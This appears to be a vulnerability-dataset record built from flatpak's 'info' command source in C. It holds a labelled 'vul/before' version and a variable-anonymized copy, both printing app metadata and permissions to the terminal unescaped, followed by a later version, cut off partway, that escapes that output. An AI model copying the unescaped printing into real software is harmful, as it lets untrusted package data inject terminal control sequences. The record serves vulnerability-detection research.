g_autoptr(GKeyFile) keyfile = NULL;
g_autofree gchar *contents = NULL;
app_context = flatpak_context_load_for_deploy (deploy, error);
if (app_context == NULL)
return FALSE;
if (opt_show_permissions)
{
keyfile = g_key_file_new ();
flatpak_context_save_metadata (app_context, TRUE, keyfile);
contents = g_key_file_to_data (keyfile, NULL, error);
if (contents == NULL)
return FALSE;
g_print (""%s"", contents);
}
if (opt_file_access)
{
g_autofree char *id = flatpak_decomposed_dup_id (ref);
g_autoptr(FlatpakExports) exports = flatpak_context_get_exports (app_context, id);
FlatpakFilesystemMode mode;
mode = flatpak_exports_path_get_mode (exports, opt_file_access);
if (mode == 0)
g_print (""hidden\n"");
else if (mode == FLATPAK_FILESYSTEM_MODE_READ_ONLY)
g_print (""read-only\n"");
else
g_print (""read-write\n"");
}
}
}
if (opt_show_extensions)
{
GList *extensions, *l;
g_autofree char *ref_arch = flatpak_decomposed_dup_arch (ref);
g_autofree char *ref_branch = flatpak_decomposed_dup_branch (ref);
len = MAX (len, g_utf8_strlen (_(""Extension:""), -1));
len = MAX (len, g_utf8_strlen (_(""ID:""), -1));
len = MAX (len, g_utf8_strlen (_(""Origin:""), -1));
len = MAX (len, g_utf8_strlen (_(""Commit:""), -1));
len = MAX (len, g_utf8_strlen (_(""Installed:""), -1));
len = MAX (len, g_utf8_strlen (_(""Subpaths:""), -1));
flatpak_get_window_size (&rows, &cols);
width = cols - (len + 1);
extensions = flatpak_list_extensions (metakey, ref_arch, ref_branch);
for (l = extensions; l; l = l->next)
{
FlatpakExtension *ext = l->data;
g_autofree const char **ext_subpaths = NULL;
g_autoptr(GBytes) ext_deploy_data = NULL;
g_autofree char *formatted = NULL;
g_autofree char *ext_formatted_size = NULL;
g_autofree char *formatted_commit = NULL;
if (ext->is_unmaintained)
{
formatted_commit = g_strdup (_(""unmaintained""));
origin = NULL;
size = 0;
ext_formatted_size = g_strdup (_(""unknown""));
ext_subpaths = NULL;
}
else
{
ext_deploy_data = flatpak_dir_get_deploy_data (dir, ext->ref, FLATPAK_DEPLOY_VERSION_CURRENT, cancellable, error);
if (ext_deploy_data == NULL)
return FALSE;
commit = flatpak_deploy_data_get_commit (ext_deploy_data);
formatted_commit = ellipsize_string (commit, width);
origin = flatpak_deploy_data_get_origin (ext_deploy_data);
size = flatpak_deploy_data_get_installed_size (ext_deploy_data);
formatted = g_format_size (size);
ext_subpaths = flatpak_deploy_data_get_subpaths (ext_deploy_data);
if (ext_subpaths && ext_subpaths[0] && size > 0)
ext_formatted_size = g_strconcat (""<"", formatted, NULL);
else
ext_formatted_size = g_steal_pointer (&formatted);
}
g_print (""\n"");
print_aligned (len, _(""Extension:""), flatpak_decomposed_get_ref (ext->ref));
print_aligned (len, _(""ID:""), ext->id);
print_aligned (len, _(""Origin:""), origin ? origin : ""-"");
print_aligned (len, _(""Commit:""), formatted_commit);
print_aligned (len, _(""Installed:""), ext_formatted_size);
if (ext_subpaths && ext_subpaths[0])
{
g_autofree char *s = g_strjoinv ("","", (char **) ext_subpaths);
print_aligned (len, _(""Subpaths:""), s);
}
}
g_list_free_full (extensions, (GDestroyNotify) flatpak_extension_free);
}
return TRUE;
}","gboolean
flatpak_builtin_info (int VAR_0, char **VAR_1, GCancellable *VAR_2, GError **VAR_3)
{
VAR_4(GOptionContext) VAR_5 = NULL;
VAR_4(FlatpakDecomposed) VAR_6 = NULL;
VAR_4(FlatpakDir) VAR_7 = NULL;
VAR_4(GBytes) VAR_8 = NULL;
VAR_4(FlatpakDeploy) VAR_9 = NULL;
VAR_4(GFile) VAR_10 = NULL;
VAR_4(GKeyFile) VAR_11 = NULL;
const char *VAR_12 = NULL;
const char *VAR_13 = NULL;
const char *VAR_14;
const char *VAR_15;
const char *VAR_16;
const char *VAR_17;
const char *VAR_18;
const char *VAR_19;
const char *VAR_20 = NULL;
const char *VAR_21 = NULL;
const char *VAR_22 = NULL;
guint64 VAR_23;
gboolean VAR_24 = FALSE;
gboolean VAR_25 = TRUE;
FlatpakKinds VAR_26;
const char *VAR_27;
g_autofree char *VAR_28 = NULL;
gboolean VAR_29 = TRUE;
g_autofree const char **VAR_30 = NULL;
int VAR_31 = 0;
int VAR_32, VAR_33;
int VAR_34;
VAR_5 = g_option_context_new (_(""NAME [BRANCH] - Get info about an installed app or runtime""));
g_option_context_set_translation_domain (VAR_5, VAR_35);
if (!flatpak_option_context_parse (VAR_5, VAR_36, &VAR_0, &VAR_1, VAR_37, NULL, VAR_2, VAR_3))
return FALSE;
if (VAR_0 < 2)
return usage_error (VAR_5, _(""NAME must be specified""), VAR_3);
VAR_20 = VAR_1[1];
if (VAR_0 >= 3)
VAR_21 = VAR_1[2];
if (VAR_0 > 3)
return usage_error (VAR_5, _(""Too many arguments""), VAR_3);
VAR_26 = VAR_38 | VAR_39;
if (!VAR_40 && !VAR_41 && VAR_42 == NULL)
VAR_24 = TRUE;
VAR_7 = flatpak_find_installed_pref (VAR_20, VAR_26, VAR_43, VAR_21,
VAR_24, VAR_40, VAR_41, VAR_42,
&VAR_6, VAR_2, VAR_3);
if (VAR_7 == NULL)
return FALSE;
VAR_8 = flatpak_dir_get_deploy_data (VAR_7, VAR_6, VAR_44, VAR_2, VAR_3);
if (VAR_8 == NULL)
return FALSE;
VAR_9 = flatpak_dir_load_deployed (VAR_7, VAR_6, NULL, VAR_2, VAR_3);
if (VAR_9 == NULL)
return FALSE;
VAR_12 = flatpak_deploy_data_get_commit (VAR_8);
VAR_13 = flatpak_deploy_data_get_alt_id (VAR_8);
VAR_22 = flatpak_deploy_data_get_origin (VAR_8);
VAR_23 = flatpak_deploy_data_get_installed_size (VAR_8);
VAR_28 = g_format_size (VAR_23);
VAR_10 = flatpak_deploy_get_dir (VAR_9);
VAR_27 = flatpak_file_get_path_cached (VAR_10);
VAR_30 = flatpak_deploy_data_get_subpaths (VAR_8);
VAR_14 = flatpak_deploy_data_get_eol (VAR_8);
VAR_15 = flatpak_deploy_data_get_eol_rebase (VAR_8);
VAR_16 = flatpak_deploy_data_get_appdata_name (VAR_8);
VAR_17 = flatpak_deploy_data_get_appdata_summary (VAR_8);
VAR_18 = flatpak_deploy_data_get_appdata_version (VAR_8);
VAR_19 = flatpak_deploy_data_get_appdata_license (VAR_8);
VAR_11 = flatpak_deploy_get_metadata (VAR_9);
if (VAR_45 || VAR_46 || VAR_47 || VAR_48 || VAR_49 || VAR_50 ||
VAR_51 || VAR_52 || VAR_53 || VAR_54)
VAR_29 = FALSE;
if (VAR_29)
{
VAR_4(GVariant) VAR_55 = NULL;
VarMetadataRef VAR_56;
guint64 VAR_57;
g_autofree char *VAR_58 = NULL;
const gchar *VAR_59 = NULL;
g_autofree char *VAR_60 = NULL;
g_autofree char *VAR_61 = NULL;
const char *VAR_62 = NULL;
const char *VAR_63 = NULL;
flatpak_get_window_size (&VAR_32, &VAR_33);
if (VAR_16)
{
if (VAR_17)
print_wrapped (MIN (VAR_33, 80), ""\n%s - %s\n"", VAR_16, VAR_17);
else
print_wrapped (MIN (VAR_33, 80), ""\n%s\n"", VAR_16);
}
VAR_61 = flatpak_dir_read_latest (VAR_7, VAR_22, flatpak_decomposed_get_ref (VAR_6), NULL, NULL, NULL);
if (VAR_61 == NULL)
VAR_61 = g_strdup (_(""ref not present in origin""));
if (ostree_repo_load_commit (flatpak_dir_get_repo (VAR_7), VAR_12, &VAR_55, NULL, NULL))
{
VarCommitRef VAR_64 = var_commit_from_gvariant (VAR_55);
VAR_59 = var_commit_get_subject (VAR_64);
VAR_60 = ostree_commit_get_parent (VAR_55);
VAR_57 = ostree_commit_get_timestamp (VAR_55);
VAR_58 = format_timestamp (VAR_57);
VAR_56 = var_commit_get_metadata (VAR_64);
VAR_62 = var_metadata_lookup_string (VAR_56, ""xa.metadata"", NULL);
if (VAR_62 == NULL)
g_printerr (_(""Warning: Commit has no flatpak metadata\n""));
VAR_63 = var_metadata_lookup_string (VAR_56, ""ostree.collection-binding"", NULL);
}
VAR_31 = 0;
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""ID:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Ref:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Arch:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Branch:""), -1));
if (VAR_18)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Version:""), -1));
if (VAR_19)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""License:""), -1));
if (VAR_63 != NULL)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Collection:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Installation:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Installed:""), -1));
if (flatpak_decomposed_is_app (VAR_6))
{
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Runtime:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Sdk:""), -1));
}
if (VAR_58)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Date:""), -1));
if (VAR_59)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Subject:""), -1));
if (strcmp (VAR_12, VAR_61) != 0)
{
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Active commit:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Latest commit:""), -1));
}
else
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Commit:""), -1));
if (VAR_60)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Parent:""), -1));
if (VAR_13)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Alt-id:""), -1));
if (VAR_14)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""End-of-life:""), -1));
if (VAR_15)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""End-of-life-rebase:""), -1));
if (VAR_30[0] != NULL)
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Subdirectories:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Extension:""), -1));
VAR_34 = VAR_33 - (VAR_31 + 1);
print_aligned_take (VAR_31, _(""ID:""), flatpak_decomposed_dup_id (VAR_6));
print_aligned (VAR_31, _(""Ref:""), flatpak_decomposed_get_ref (VAR_6));
print_aligned_take (VAR_31, _(""Arch:""), flatpak_decomposed_dup_arch (VAR_6));
print_aligned_take (VAR_31, _(""Branch:""), flatpak_decomposed_dup_branch (VAR_6));
if (VAR_18)
print_aligned (VAR_31, _(""Version:""), VAR_18);
if (VAR_19)
print_aligned (VAR_31, _(""License:""), VAR_19);
print_aligned (VAR_31, _(""Origin:""), VAR_22 ? VAR_22 : ""-"");
if (VAR_63)
print_aligned (VAR_31, _(""Collection:""), VAR_63);
print_aligned (VAR_31, _(""Installation:""), flatpak_dir_get_name_cached (VAR_7));
print_aligned (VAR_31, _(""Installed:""), VAR_28);
if (flatpak_decomposed_is_app (VAR_6))
{
g_autofree char *VAR_65 = NULL;
VAR_65 = g_key_file_get_string (VAR_11,
VAR_66,
VAR_67,
VAR_3);
print_aligned (VAR_31, _(""Runtime:""), VAR_65 ? VAR_65 : ""-"");
}
if (flatpak_decomposed_is_app (VAR_6))
{
g_autofree char *VAR_68 = NULL;
VAR_68 = g_key_file_get_string (VAR_11,
VAR_66,
VAR_69,
VAR_3);
print_aligned (VAR_31, _(""Sdk:""), VAR_68 ? VAR_68 : ""-"");
}
g_print (""\n"");
if (strcmp (VAR_12, VAR_61) != 0)
{
g_autofree char *VAR_70 = ellipsize_string (VAR_12, VAR_34);
print_aligned (VAR_31, _(""Active commit:""), VAR_70);
g_free (VAR_70);
VAR_70 = ellipsize_string (VAR_61, VAR_34);
print_aligned (VAR_31, _(""Latest commit:""), VAR_70);
}
else
{
g_autofree char *VAR_70 = ellipsize_string (VAR_12, VAR_34);
print_aligned (VAR_31, _(""Commit:""), VAR_70);
}
if (VAR_60)
{
g_autofree char *VAR_70 = ellipsize_string (VAR_60, VAR_34);
print_aligned (VAR_31, _(""Parent:""), VAR_70);
}
if (VAR_59)
print_aligned (VAR_31, _(""Subject:""), VAR_59);
if (VAR_58)
print_aligned (VAR_31, _(""Date:""), VAR_58);
if (VAR_30[0] != NULL)
{
g_autofree char *VAR_71 = g_strjoinv ("","", (char **) VAR_30);
print_aligned (VAR_31, _(""Subdirectories:""), VAR_71);
}
if (VAR_13)
print_aligned (VAR_31, _(""Alt-id:""), VAR_13);
if (VAR_14)
{
g_autofree char *VAR_72 = ellipsize_string (VAR_14, VAR_34);
print_aligned (VAR_31, _(""End-of-life:""), VAR_72);
}
if (VAR_15)
{
g_autofree char *VAR_72 = ellipsize_string (VAR_15, VAR_34);
print_aligned (VAR_31, _(""End-of-life-rebase:""), VAR_72);
}
}
else
{
if (VAR_45)
{
maybe_print_space (&VAR_25);
g_print (""%s"", flatpak_decomposed_get_ref (VAR_6));
}
if (VAR_46)
{
maybe_print_space (&VAR_25);
g_print (""%s"", VAR_22 ? VAR_22 : ""-"");
}
if (VAR_47)
{
maybe_print_space (&VAR_25);
g_print (""%s"", VAR_12);
}
if (VAR_48)
{
maybe_print_space (&VAR_25);
g_print (""%"" VAR_73, VAR_23);
}
if (VAR_52)
{
maybe_print_space (&VAR_25);
g_print (""%s"", VAR_27);
}
if (VAR_53)
{
g_autofree char *VAR_65 = NULL;
maybe_print_space (&VAR_25);
VAR_65 = g_key_file_get_string (VAR_11,
flatpak_decomposed_get_kind_metadata_group (VAR_6),
VAR_67,
NULL);
g_print (""%s"", VAR_65 ? VAR_65 : ""-"");
}
if (VAR_54)
{
g_autofree char *VAR_68 = NULL;
maybe_print_space (&VAR_25);
VAR_68 = g_key_file_get_string (VAR_11,
flatpak_decomposed_get_kind_metadata_group (VAR_6),
VAR_69,
NULL);
g_print (""%s"", VAR_68 ? VAR_68 : ""-"");
}
if (!VAR_25)
g_print (""\n"");
if (VAR_49)
{
VAR_4(GFile) VAR_74 = NULL;
g_autofree char *VAR_75 = NULL;
gsize VAR_76;
VAR_74 = g_file_get_child (VAR_10, ""metadata"");
if (!g_file_load_contents (VAR_74, VAR_2, &VAR_75, &VAR_76, NULL, VAR_3))
return FALSE;
g_print (""%s"", VAR_75);
}
if (VAR_50 || VAR_51)
{
VAR_4(FlatpakContext) VAR_77 = NULL;
VAR_4(GKeyFile) VAR_78 = NULL;
g_autofree gchar *VAR_79 = NULL;
VAR_77 = flatpak_context_load_for_deploy (VAR_9, VAR_3);
if (VAR_77 == NULL)
return FALSE;
if (VAR_50)
{
VAR_78 = g_key_file_new ();
flatpak_context_save_metadata (VAR_77, TRUE, VAR_78);
VAR_79 = g_key_file_to_data (VAR_78, NULL, VAR_3);
if (VAR_79 == NULL)
return FALSE;
g_print (""%s"", VAR_79);
}
if (VAR_51)
{
g_autofree char *VAR_80 = flatpak_decomposed_dup_id (VAR_6);
VAR_4(FlatpakExports) VAR_81 = flatpak_context_get_exports (VAR_77, VAR_80);
FlatpakFilesystemMode VAR_82;
VAR_82 = flatpak_exports_path_get_mode (VAR_81, VAR_51);
if (VAR_82 == 0)
g_print (""hidden\n"");
else if (VAR_82 == VAR_83)
g_print (""read-only\n"");
else
g_print (""read-write\n"");
}
}
}
if (VAR_84)
{
GList *VAR_85, *VAR_86;
g_autofree char *VAR_87 = flatpak_decomposed_dup_arch (VAR_6);
g_autofree char *VAR_88 = flatpak_decomposed_dup_branch (VAR_6);
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Extension:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""ID:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Origin:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Commit:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Installed:""), -1));
VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Subpaths:""), -1));
flatpak_get_window_size (&VAR_32, &VAR_33);
VAR_34 = VAR_33 - (VAR_31 + 1);
VAR_85 = flatpak_list_extensions (VAR_11, VAR_87, VAR_88);
for (VAR_86 = VAR_85; VAR_86; VAR_86 = VAR_86->next)
{
FlatpakExtension *VAR_89 = VAR_86->data;
g_autofree const char **VAR_90 = NULL;
VAR_4(GBytes) VAR_91 = NULL;
g_autofree char *VAR_92 = NULL;
g_autofree char *VAR_93 = NULL;
g_autofree char *VAR_70 = NULL;
if (VAR_89->is_unmaintained)
{
VAR_70 = g_strdup (_(""unmaintained""));
VAR_22 = NULL;
VAR_23 = 0;
VAR_93 = g_strdup (_(""unknown""));
VAR_90 = NULL;
}
else
{
VAR_91 = flatpak_dir_get_deploy_data (VAR_7, VAR_89->ref, VAR_44, VAR_2, VAR_3);
if (VAR_91 == NULL)
return FALSE;
VAR_12 = flatpak_deploy_data_get_commit (VAR_91);
VAR_70 = ellipsize_string (VAR_12, VAR_34);
VAR_22 = flatpak_deploy_data_get_origin (VAR_91);
VAR_23 = flatpak_deploy_data_get_installed_size (VAR_91);
VAR_92 = g_format_size (VAR_23);
VAR_90 = flatpak_deploy_data_get_subpaths (VAR_91);
if (VAR_90 && VAR_90[0] && VAR_23 > 0)
VAR_93 = g_strconcat (""<"", VAR_92, NULL);
else
VAR_93 = g_steal_pointer (&VAR_92);
}
g_print (""\n"");
print_aligned (VAR_31, _(""Extension:""), flatpak_decomposed_get_ref (VAR_89->ref));
print_aligned (VAR_31, _(""ID:""), VAR_89->id);
print_aligned (VAR_31, _(""Origin:""), VAR_22 ? VAR_22 : ""-"");
print_aligned (VAR_31, _(""Commit:""), VAR_70);
print_aligned (VAR_31, _(""Installed:""), VAR_93);
if (VAR_90 && VAR_90[0])
{
g_autofree char *VAR_71 = g_strjoinv ("","", (char **) VAR_90);
print_aligned (VAR_31, _(""Subpaths:""), VAR_71);
}
}
g_list_free_full (VAR_85, (GDestroyNotify) VAR_94);
}
return TRUE;
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-builtins-info.c/vul/before/0.json,"gboolean
flatpak_builtin_info (int argc, char **argv, GCancellable *cancellable, GError **error)
{
  g_autoptr(GOptionContext) context = NULL;
  g_autoptr(FlatpakDecomposed) ref = NULL;
  g_autoptr(FlatpakDir) dir = NULL;
  g_autoptr(GBytes) deploy_data = NULL;
  g_autoptr(FlatpakDeploy) deploy = NULL;
  g_autoptr(GFile) deploy_dir = NULL;
  g_autoptr(GKeyFile) metakey = NULL;
  const char *commit = NULL;
  const char *alt_id = NULL;
  const char *eol;
  const char *eol_rebase;
  const char *name;
  const char *summary;
  const char *version;
  const char *license;
  const char *pref = NULL;
  const char *default_branch = NULL;
  const char *origin = NULL;
  guint64 size;
  gboolean search_all = FALSE;
  gboolean first = TRUE;
  FlatpakKinds kinds;
  const char *path;
  g_autofree char *formatted_size = NULL;
  gboolean friendly = TRUE;
  g_autofree const char **subpaths = NULL;
  int len = 0;
  int rows, cols;
  int width;

  context = g_option_context_new (_(""NAME [BRANCH] - Get info about an installed app or runtime""));
  g_option_context_set_translation_domain (context, GETTEXT_PACKAGE);

  if (!flatpak_option_context_parse (context, options, &argc, &argv, FLATPAK_BUILTIN_FLAG_NO_DIR, NULL, cancellable, error))
    return FALSE;

  if (argc < 2)
    return usage_error (context, _(""NAME must be specified""), error);
  pref = argv[1];

  if (argc >= 3)
    default_branch = argv[2];

  if (argc > 3)
    return usage_error (context, _(""Too many arguments""), error);

  kinds = FLATPAK_KINDS_APP | FLATPAK_KINDS_RUNTIME;

  if (!opt_user && !opt_system && opt_installations == NULL)
    search_all = TRUE;

  dir = flatpak_find_installed_pref (pref, kinds, opt_arch, default_branch,
                                     search_all, opt_user, opt_system, opt_installations,
                                     &ref, cancellable, error);
  if (dir == NULL)
    return FALSE;

  deploy_data = flatpak_dir_get_deploy_data (dir, ref, FLATPAK_DEPLOY_VERSION_CURRENT, cancellable, error);
  if (deploy_data == NULL)
    return FALSE;

  deploy = flatpak_dir_load_deployed (dir, ref, NULL, cancellable, error);
  if (deploy == NULL)
    return FALSE;

  commit = flatpak_deploy_data_get_commit (deploy_data);
  alt_id = flatpak_deploy_data_get_alt_id (deploy_data);
  origin = flatpak_deploy_data_get_origin (deploy_data);
  size = flatpak_deploy_data_get_installed_size (deploy_data);
  formatted_size = g_format_size (size);
  deploy_dir = flatpak_deploy_get_dir (deploy);
  path = flatpak_file_get_path_cached (deploy_dir);
  subpaths = flatpak_deploy_data_get_subpaths (deploy_data);
  eol = flatpak_deploy_data_get_eol (deploy_data);
  eol_rebase = flatpak_deploy_data_get_eol_rebase (deploy_data);
  name = flatpak_deploy_data_get_appdata_name (deploy_data);
  summary = flatpak_deploy_data_get_appdata_summary (deploy_data);
  version = flatpak_deploy_data_get_appdata_version (deploy_data);
  license = flatpak_deploy_data_get_appdata_license (deploy_data);

  metakey = flatpak_deploy_get_metadata (deploy);

  if (opt_show_ref || opt_show_origin || opt_show_commit || opt_show_size || opt_show_metadata || opt_show_permissions ||
      opt_file_access || opt_show_location || opt_show_runtime || opt_show_sdk)
    friendly = FALSE;

  if (friendly)
    {
      g_autoptr(GVariant) commit_v = NULL;
      VarMetadataRef commit_metadata;
      guint64 timestamp;
      g_autofree char *formatted_timestamp = NULL;
      const gchar *subject = NULL;
      g_autofree char *parent = NULL;
      g_autofree char *latest = NULL;
      const char *xa_metadata = NULL;
      const char *collection_id = NULL;

      flatpak_get_window_size (&rows, &cols);

      if (name)
        {
          if (summary)
            print_wrapped (MIN (cols, 80), ""\n%s - %s\n"", name, summary);
          else
            print_wrapped (MIN (cols, 80), ""\n%s\n"", name);
        }

      latest = flatpak_dir_read_latest (dir, origin, flatpak_decomposed_get_ref (ref), NULL, NULL, NULL);
      if (latest == NULL)
        latest = g_strdup (_(""ref not present in origin""));

      if (ostree_repo_load_commit (flatpak_dir_get_repo (dir), commit, &commit_v, NULL, NULL))
        {
          VarCommitRef var_commit = var_commit_from_gvariant (commit_v);

          subject = var_commit_get_subject (var_commit);
          parent = ostree_commit_get_parent (commit_v);
          timestamp = ostree_commit_get_timestamp (commit_v);

          formatted_timestamp = format_timestamp (timestamp);

          commit_metadata = var_commit_get_metadata (var_commit);
          xa_metadata = var_metadata_lookup_string (commit_metadata, ""xa.metadata"", NULL);
          if (xa_metadata == NULL)
            g_printerr (_(""Warning: Commit has no flatpak metadata\n""));

          collection_id = var_metadata_lookup_string (commit_metadata, ""ostree.collection-binding"", NULL);
        }

      len = 0;
      len = MAX (len, g_utf8_strlen (_(""ID:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Ref:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Arch:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Branch:""), -1));
      if (version)
        len = MAX (len, g_utf8_strlen (_(""Version:""), -1));
      if (license)
        len = MAX (len, g_utf8_strlen (_(""License:""), -1));
      if (collection_id != NULL)
        len = MAX (len, g_utf8_strlen (_(""Collection:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Installation:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Installed:""), -1));
      if (flatpak_decomposed_is_app (ref))
        {
          len = MAX (len, g_utf8_strlen (_(""Runtime:""), -1));
          len = MAX (len, g_utf8_strlen (_(""Sdk:""), -1));
        }
      if (formatted_timestamp)
        len = MAX (len, g_utf8_strlen (_(""Date:""), -1));
      if (subject)
        len = MAX (len, g_utf8_strlen (_(""Subject:""), -1));
      if (strcmp (commit, latest) != 0)
        {
          len = MAX (len, g_utf8_strlen (_(""Active commit:""), -1));
          len = MAX (len, g_utf8_strlen (_(""Latest commit:""), -1));
        }
      else
        len = MAX (len, g_utf8_strlen (_(""Commit:""), -1));
      if (parent)
        len = MAX (len, g_utf8_strlen (_(""Parent:""), -1));
      if (alt_id)
        len = MAX (len, g_utf8_strlen (_(""Alt-id:""), -1));
      if (eol)
        len = MAX (len, g_utf8_strlen (_(""End-of-life:""), -1));
      if (eol_rebase)
        len = MAX (len, g_utf8_strlen (_(""End-of-life-rebase:""), -1));
      if (subpaths[0] != NULL)
        len = MAX (len, g_utf8_strlen (_(""Subdirectories:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Extension:""), -1));

      width = cols - (len + 1);

      print_aligned_take (len, _(""ID:""), flatpak_decomposed_dup_id (ref));
      print_aligned (len, _(""Ref:""), flatpak_decomposed_get_ref (ref));
      print_aligned_take (len, _(""Arch:""), flatpak_decomposed_dup_arch (ref));
      print_aligned_take (len, _(""Branch:""), flatpak_decomposed_dup_branch (ref));
      if (version)
        print_aligned (len, _(""Version:""), version);
      if (license)
        print_aligned (len, _(""License:""), license);
      print_aligned (len, _(""Origin:""), origin ? origin : ""-"");
      if (collection_id)
        print_aligned (len, _(""Collection:""), collection_id);
      print_aligned (len, _(""Installation:""), flatpak_dir_get_name_cached (dir));
      print_aligned (len, _(""Installed:""), formatted_size);
      if (flatpak_decomposed_is_app (ref))
        {
          g_autofree char *runtime = NULL;
          runtime = g_key_file_get_string (metakey,
                                           FLATPAK_METADATA_GROUP_APPLICATION,
                                           FLATPAK_METADATA_KEY_RUNTIME,
                                           error);
          print_aligned (len, _(""Runtime:""), runtime ? runtime : ""-"");
        }
      if (flatpak_decomposed_is_app (ref))
        {
          g_autofree char *sdk = NULL;
          sdk = g_key_file_get_string (metakey,
                                       FLATPAK_METADATA_GROUP_APPLICATION,
                                       FLATPAK_METADATA_KEY_SDK,
                                       error);
          print_aligned (len, _(""Sdk:""), sdk ? sdk : ""-"");
        }
      g_print (""\n"");

      if (strcmp (commit, latest) != 0)
        {
          g_autofree char *formatted_commit = ellipsize_string (commit, width);
          print_aligned (len, _(""Active commit:""), formatted_commit);
          g_free (formatted_commit);
          formatted_commit = ellipsize_string (latest, width);
          print_aligned (len, _(""Latest commit:""), formatted_commit);
        }
      else
        {
          g_autofree char *formatted_commit = ellipsize_string (commit, width);
          print_aligned (len, _(""Commit:""), formatted_commit);
        }
      if (parent)
        {
          g_autofree char *formatted_commit = ellipsize_string (parent, width);
          print_aligned (len, _(""Parent:""), formatted_commit);
        }
      if (subject)
        print_aligned (len, _(""Subject:""), subject);
      if (formatted_timestamp)
        print_aligned (len, _(""Date:""), formatted_timestamp);
      if (subpaths[0] != NULL)
        {
          g_autofree char *s = g_strjoinv ("","", (char **) subpaths);
          print_aligned (len, _(""Subdirectories:""), s);
        }

      if (alt_id)
        print_aligned (len, _(""Alt-id:""), alt_id);
      if (eol)
        {
          g_autofree char *formatted_eol = ellipsize_string (eol, width);
          print_aligned (len, _(""End-of-life:""), formatted_eol);
        }
      if (eol_rebase)
        {
          g_autofree char *formatted_eol = ellipsize_string (eol_rebase, width);
          print_aligned (len, _(""End-of-life-rebase:""), formatted_eol);
        }
    }
  else
    {
      if (opt_show_ref)
        {
          maybe_print_space (&first);
          g_print (""%s"", flatpak_decomposed_get_ref (ref));
        }

      if (opt_show_origin)
        {
          maybe_print_space (&first);
          g_print (""%s"", origin ? origin : ""-"");
        }

      if (opt_show_commit)
        {
          maybe_print_space (&first);
          g_print (""%s"", commit);
        }

      if (opt_show_size)
        {
          maybe_print_space (&first);
          g_print (""%"" G_GUINT64_FORMAT, size);
        }

      if (opt_show_location)
        {
          maybe_print_space (&first);
          g_print (""%s"", path);
        }

      if (opt_show_runtime)
        {
          g_autofree char *runtime = NULL;
          maybe_print_space (&first);

          runtime = g_key_file_get_string (metakey,
                                           flatpak_decomposed_get_kind_metadata_group (ref),
                                           FLATPAK_METADATA_KEY_RUNTIME,
                                           NULL);
          g_print (""%s"", runtime ? runtime : ""-"");
        }

      if (opt_show_sdk)
        {
          g_autofree char *sdk = NULL;
          maybe_print_space (&first);

          sdk = g_key_file_get_string (metakey,
                                       flatpak_decomposed_get_kind_metadata_group (ref),
                                       FLATPAK_METADATA_KEY_SDK,
                                       NULL);
          g_print (""%s"", sdk ? sdk : ""-"");
        }

      if (!first)
        g_print (""\n"");

      if (opt_show_metadata)
        {
          g_autoptr(GFile) file = NULL;
          g_autofree char *data = NULL;
          gsize data_size;

          file = g_file_get_child (deploy_dir, ""metadata"");

          if (!g_file_load_contents (file, cancellable, &data, &data_size, NULL, error))
            return FALSE;

          flatpak_print_escaped_string (data,
                                        FLATPAK_ESCAPE_ALLOW_NEWLINES
                                        | FLATPAK_ESCAPE_DO_NOT_QUOTE);
        }

      if (opt_show_permissions || opt_file_access)
        {
          g_autoptr(FlatpakContext) app_context = NULL;
          g_autoptr(GKeyFile) keyfile = NULL;
          g_autofree gchar *contents = NULL;

          app_context = flatpak_context_load_for_deploy (deploy, error);
          if (app_context == NULL)
            return FALSE;

          if (opt_show_permissions)
            {
              keyfile = g_key_file_new ();
              flatpak_context_save_metadata (app_context, TRUE, keyfile);
              contents = g_key_file_to_data (keyfile, NULL, error);
              if (contents == NULL)
                return FALSE;

              flatpak_print_escaped_string (contents,
                                            FLATPAK_ESCAPE_ALLOW_NEWLINES
                                            | FLATPAK_ESCAPE_DO_NOT_QUOTE);
            }

          if (opt_file_access)
            {
              g_autofree char *id = flatpak_decomposed_dup_id (ref);
              g_autoptr(FlatpakExports) exports = flatpak_context_get_exports (app_context, id);
              FlatpakFilesystemMode mode;

              mode = flatpak_exports_path_get_mode (exports, opt_file_access);
              if (mode == 0)
                g_print (""hidden\n"");
              else if (mode == FLATPAK_FILESYSTEM_MODE_READ_ONLY)
                g_print (""read-only\n"");
              else
                g_print (""read-write\n"");
            }
        }
    }

  if (opt_show_extensions)
    {
      GList *extensions, *l;
      g_autofree char *ref_arch = flatpak_decomposed_dup_arch (ref);
      g_autofree char *ref_branch = flatpak_decomposed_dup_branch (ref);

      len = MAX (len, g_utf8_strlen (_(""Extension:""), -1));
      len = MAX (len, g_utf8_strlen (_(""ID:""), -1));
